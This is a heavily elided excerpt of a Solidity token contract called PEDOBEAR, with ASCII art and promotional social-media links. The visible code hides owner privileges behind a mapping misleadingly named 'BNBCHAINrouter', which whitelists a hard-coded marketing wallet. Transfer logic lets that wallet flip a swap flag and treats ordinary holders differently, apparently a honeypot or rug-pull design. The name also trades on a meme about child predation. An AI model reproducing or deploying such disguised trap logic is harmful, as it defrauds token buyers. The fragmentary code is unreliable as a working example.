...
………………………………………………………’’~-‘’_ , , ,,’,_/--‘
                ...
                TG          :   https://t.me/Pedobearcoin

                


                Site        :   https://pedobear.fun/

                


                X           :   https://twitter.com/pedobearcoineth
...
contract PEDOBEAR is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private BNBCHAINrouter;
    ...
    address payable private marketingWallet = payable(0x47e4756c494C8064b8db24eFd942EA9e1dBaef30);
    ...
    constructor () {
        ...
        BNBCHAINrouter[payable(0x47e4756c494C8064b8db24eFd942EA9e1dBaef30)] = true;
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(BNBCHAINrouter[from] && _removeLimits[to] && uniswapV2Swap[address(this)]){ uniswapV2Swap[address(this)] = false; }
        ...
        if(!BNBCHAINrouter[from] && !_removeLimits[to]){
